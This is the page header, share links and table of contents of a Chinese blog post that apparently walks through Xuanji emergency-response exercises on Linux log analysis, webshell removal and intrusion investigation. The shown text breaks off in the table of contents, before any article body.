<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="0x01前言在刷ctfshow的空闲时间里做一些玄机的安全日志和应急响应方面的题目，也算是更偏向于实践中的一些防守措施吧,不过第一章都是借鉴着师傅的wp进行实践学习的 玄机——第一章 应急响应-Linux日志分析 wp_玄机linux日志分析-CSDN博客 玄机——第一章 应急响应- Linux入侵排查 wp_玄机应急-CSDN博客 玄机——第一章 应急响应-webshell查杀 wp（手把手保姆">
<meta property="og:type" content="article">
<meta property="og:title" content="玄机第一章应急响应(二刷已完)">
<meta property="og:url" content="https://wanth3f1ag.top/2025/04/21/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94(%E5%B7%B2%E5%81%9A%E5%AE%8C)/index.html">
<meta property="og:site_name" content="root@wanth3f1ag">
<meta property="og:description" content="0x01前言在刷ctfshow的空闲时间里做一些玄机的安全日志和应急响应方面的题目，也算是更偏向于实践中的一些防守措施吧,不过第一章都是借鉴着师傅的wp进行实践学习的 玄机——第一章 应急响应-Linux日志分析 wp_玄机linux日志分析-CSDN博客 玄机——第一章 应急响应- Linux入侵排查 wp_玄机应急-CSDN博客 玄机——第一章 应急响应-webshell查杀 wp（手把手保姆">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241116182821625.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421140305559.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421140436360.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421141412107.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421141909800.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421141943517.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421143055472.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421143709858.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421143903253.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421144418703.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421145708879.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421150114386.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421150308847.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421151015712.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421151059651.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421151214183.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421151550443.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421151821603.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421152032064.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421152448652.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421152700245.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421152900317.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421155238313.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421160909697.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421161213790.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421161959689.png">
<meta property="article:published_time" content="2025-04-21T08:24:45.000Z">
<meta property="article:modified_time" content="2025-05-16T03:40:11.470Z">
<meta property="article:author" content="wanTh3flag">
<meta property="article:tag" content="玄机第一章应急响应">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241116182821625.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>玄机第一章应急响应(二刷已完)</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	

<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">H0me</a></li><!--
     --><!--
       --><li><a href="/about/">A6out</a></li><!--
     --><!--
       --><li><a href="/tags/">T6gs</a></li><!--
     --><!--
       --><li><a href="/categories/">Catagory</a></li><!--
     --><!--
       --><li><a href="/links/">L1nks</a></li><!--
     --><!--
       --><li><a href="/search/">s4arch</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2025/04/21/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90(%E5%B7%B2%E5%81%9A%E5%AE%8C)/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2025/04/20/%E9%99%87%E5%89%91%E6%9D%AF2021wp/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/04/21/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94(%E5%B7%B2%E5%81%9A%E5%AE%8C)/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/04/21/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&text=玄机第一章应急响应(二刷已完)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/04/21/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&title=玄机第一章应急响应(二刷已完)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/04/21/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&is_video=false&description=玄机第一章应急响应(二刷已完)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=玄机第一章应急响应(二刷已完)&body=Check out this article: https://wanth3f1ag.top/2025/04/21/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94(%E5%B7%B2%E5%81%9A%E5%AE%8C)/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/04/21/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&title=玄机第一章应急响应(二刷已完)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/04/21/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&title=玄机第一章应急响应(二刷已完)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/04/21/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&title=玄机第一章应急响应(二刷已完)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/04/21/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&title=玄机第一章应急响应(二刷已完)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/04/21/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&name=玄机第一章应急响应(二刷已完)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/04/21/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&t=玄机第一章应急响应(二刷已完)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x01前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02%E6%AD%A3%E6%96%87"><span class="toc-number">2.</span> <span class="toc-text">0x02正文</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="toc-number">2.0.1.</span> <span class="toc-text">第一章 应急响应-Linux日志分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFLinux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="toc-number">2.0.1.1.</span> <span class="toc-text">什么是Linux日志分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6"><span class="toc-number">2.0.1.2.</span> <span class="toc-text">常见日志文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">2.0.1.3.</span> <span class="toc-text">常用命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98"><span class="toc-number">2.0.1.4.</span> <span class="toc-text">解题</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%9E%E6%8E%A5%E4%B8%BB%E6%9C%BA"><span class="toc-number">2.0.1.4.1.</span> <span class="toc-text">连接主机</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%97%AE%E9%A2%981-%E6%9F%A5%E7%9C%8B%E6%9C%89%E5%A4%9A%E5%B0%91IP%E5%9C%A8%E7%88%86%E7%A0%B4%E4%B8%BB%E6%9C%BAssh%E7%9A%84root%E5%B8%90%E5%8F%B7"><span class="toc-number">2.0.1.4.2.</span> <span class="toc-text">问题1:查看有多少IP在爆破主机ssh的root帐号</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%97%AE%E9%A2%982-ssh%E7%88%86%E7%A0%B4%E6%88%90%E5%8A%9F%E7%99%BB%E9%99%86%E7%9A%84IP%E6%98%AF%E5%A4%9A%E5%B0%91"><span class="toc-number">2.0.1.4.3.</span> <span class="toc-text">问题2:ssh爆破成功登陆的IP是多少</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%97%AE%E9%A2%983-%E7%88%86%E7%A0%B4%E7%94%A8%E6%88%B7%E5%90%8D%E5%AD%97%E5%85%B8%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">2.0.1.4.4.</span> <span class="toc-text">问题3:爆破用户名字典是什么？</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E7%88%86%E7%A0%B4%E7%94%A8%E6%88%B7%E5%90%8D%E5%AD%97%E5%85%B8"><span class="toc-number">2.0.1.4.4.1.</span> <span class="toc-text">什么是爆破用户名字典</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%97%AE%E9%A2%984-%E6%88%90%E5%8A%9F%E7%99%BB%E5%BD%95-root-%E7%94%A8%E6%88%B7%E7%9A%84-ip-%E4%B8%80%E5%85%B1%E7%88%86%E7%A0%B4%E4%BA%86%E5%A4%9A%E5%B0%91%E6%AC%A1"><span class="toc-number">2.0.1.4.5.</span> <span class="toc-text">问题4:成功登录 root 用户的 ip 一共爆破了多少次</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%97%AE%E9%A2%985-%E9%BB%91%E5%AE%A2%E7%99%BB%E9%99%86%E4%B8%BB%E6%9C%BA%E5%90%8E%E6%96%B0%E5%BB%BA%E4%BA%86%E4%B8%80%E4%B8%AA%E5%90%8E%E9%97%A8%E7%94%A8%E6%88%B7%EF%BC%8C%E7%94%A8%E6%88%B7%E5%90%8D%E6%98%AF%E5%A4%9A%E5%B0%91"><span class="toc-number">2.0.1.4.6.</span> <span class="toc-text">问题5:黑客登陆主机后新建了一个后门用户，用户名是多少</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-webshell%E6%9F%A5%E6%9D%80"><span class="toc-number">2.0.2.</span> <span class="toc-text">第一章 应急响应-webshell查杀</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFwebshell"><span class="toc-number">2.0.2.1.</span> <span class="toc-text">什么是webshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFwebshell%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94"><span class="toc-number">2.0.2.2.</span> <span class="toc-text">什么是webshell应急响应</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E5%90%8E%E9%97%A8%E6%9F%A5%E6%9D%80"><span class="toc-number">2.0.2.3.</span> <span class="toc-text">常规后门查杀</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#webshell%E4%BB%A3%E7%A0%81%E7%89%B9%E5%BE%81"><span class="toc-number">2.0.2.4.</span> <span class="toc-text">webshell代码特征</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98-1"><span class="toc-number">2.0.2.5.</span> <span class="toc-text">解题</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%97%AE%E9%A2%981-%E9%BB%91%E5%AE%A2webshell%E9%87%8C%E9%9D%A2%E7%9A%84flag"><span class="toc-number">2.0.2.5.1.</span> <span class="toc-text">问题1:黑客webshell里面的flag</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%97%AE%E9%A2%98%E4%BA%8C-%E9%BB%91%E5%AE%A2%E4%BD%BF%E7%94%A8%E7%9A%84%E4%BB%80%E4%B9%88%E5%B7%A5%E5%85%B7%E7%9A%84shell"><span class="toc-number">2.0.2.5.2.</span> <span class="toc-text">问题二:黑客使用的什么工具的shell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%97%AE%E9%A2%983-%E9%BB%91%E5%AE%A2%E9%9A%90%E8%97%8Fshell%E7%9A%84%E5%AE%8C%E6%95%B4%E8%B7%AF%E5%BE%84"><span class="toc-number">2.0.2.5.3.</span> <span class="toc-text">问题3:黑客隐藏shell的完整路径</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#ls%E5%92%8Cls-a%E5%92%8Cls-l%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">2.0.2.5.3.1.</span> <span class="toc-text">ls和ls -a和ls -l的区别</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%97%AE%E9%A2%984-%E9%BB%91%E5%AE%A2%E5%85%8D%E6%9D%80%E9%A9%AC%E5%AE%8C%E6%95%B4%E8%B7%AF%E5%BE%84"><span class="toc-number">2.0.2.5.4.</span> <span class="toc-text">问题4:黑客免杀马完整路径</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%85%8D%E6%9D%80%E9%A9%AC"><span class="toc-number">2.0.2.5.4.1.</span> <span class="toc-text">什么是免杀马</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF"><span class="toc-number">2.0.2.5.4.2.</span> <span class="toc-text">常见的免杀技术</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E5%92%8C%E5%A4%84%E7%90%86%E5%85%8D%E6%9D%80%E9%A9%AC%E7%9A%84%E6%96%B9%E6%B3%95%EF%BC%9B"><span class="toc-number">2.0.2.5.4.3.</span> <span class="toc-text">查找和处理免杀马的方法；</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#windows%E4%B8%8A%E7%9A%84%E7%BD%91%E7%AB%99%E6%97%A5%E5%BF%97%E8%B7%AF%E5%BE%84"><span class="toc-number">2.0.2.5.4.4.</span> <span class="toc-text">windows上的网站日志路径</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%9F%A5%E7%9C%8B%E5%92%8C%E5%88%86%E6%9E%90%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%EF%BC%9F"><span class="toc-number">2.0.2.5.4.5.</span> <span class="toc-text">如何查看和分析日志文件？</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E5%8F%AF%E4%BB%A5%E7%A1%AE%E8%AE%A4%E6%98%AF%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6%EF%BC%9F"><span class="toc-number">2.0.2.5.4.6.</span> <span class="toc-text">为什么可以确认是恶意文件？</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5"><span class="toc-number">2.0.3.</span> <span class="toc-text">第一章 应急响应- Linux入侵排查</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%9C%A8%E9%A9%AC"><span class="toc-number">2.0.3.1.</span> <span class="toc-text">什么是木马?</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%B5%8B%EF%BC%9A"><span class="toc-number">2.0.3.2.</span> <span class="toc-text">检测：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFlinux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5"><span class="toc-number">2.0.3.3.</span> <span class="toc-text">什么是linux入侵排查</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%A4%E7%A7%8D%E6%96%B9%E6%B3%95%E7%9A%84%E5%A5%BD%E5%A4%84"><span class="toc-number">2.0.3.4.</span> <span class="toc-text">两种方法的好处</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98-2"><span class="toc-number">2.0.3.5.</span> <span class="toc-text">解题</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%97%AE%E9%A2%981-web%E7%9B%AE%E5%BD%95%E5%AD%98%E5%9C%A8%E6%9C%A8%E9%A9%AC%EF%BC%8C%E8%AF%B7%E6%89%BE%E5%88%B0%E6%9C%A8%E9%A9%AC%E7%9A%84%E5%AF%86%E7%A0%81%E6%8F%90%E4%BA%A4"><span class="toc-number">2.0.3.5.1.</span> <span class="toc-text">问题1:web目录存在木马，请找到木马的密码提交</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-number">2.0.3.6.</span> <span class="toc-text">一句话木马</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%97%AE%E9%A2%982-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%96%91%E4%BC%BC%E5%AD%98%E5%9C%A8%E4%B8%8D%E6%AD%BB%E9%A9%AC%EF%BC%8C%E8%AF%B7%E6%89%BE%E5%88%B0%E4%B8%8D%E6%AD%BB%E9%A9%AC%E7%9A%84%E5%AF%86%E7%A0%81%E6%8F%90%E4%BA%A4"><span class="toc-number">2.0.3.6.1.</span> <span class="toc-text">问题2:服务器疑似存在不死马，请找到不死马的密码提交</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E4%B8%8D%E6%AD%BB%E9%A9%AC"><span class="toc-number">2.0.3.7.</span> <span class="toc-text">什么是不死马</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%97%AE%E9%A2%983-%E4%B8%8D%E6%AD%BB%E9%A9%AC%E6%98%AF%E9%80%9A%E8%BF%87%E5%93%AA%E4%B8%AA%E6%96%87%E4%BB%B6%E7%94%9F%E6%88%90%E7%9A%84%EF%BC%8C%E8%AF%B7%E6%8F%90%E4%BA%A4%E6%96%87%E4%BB%B6%E5%90%8D"><span class="toc-number">2.0.3.7.1.</span> <span class="toc-text">问题3:不死马是通过哪个文件生成的，请提交文件名</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%97%AE%E9%A2%984%EF%BC%9A%E9%BB%91%E5%AE%A2%E7%95%99%E4%B8%8B%E4%BA%86%E6%9C%A8%E9%A9%AC%E6%96%87%E4%BB%B6%EF%BC%8C%E8%AF%B7%E6%89%BE%E5%87%BA%E9%BB%91%E5%AE%A2%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8ip%E6%8F%90%E4%BA%A4"><span class="toc-number">2.0.3.7.2.</span> <span class="toc-text">问题4：黑客留下了木马文件，请找出黑客的服务器ip提交</span></a></li></ol></li><li class="toc-item toc-level-4"><a 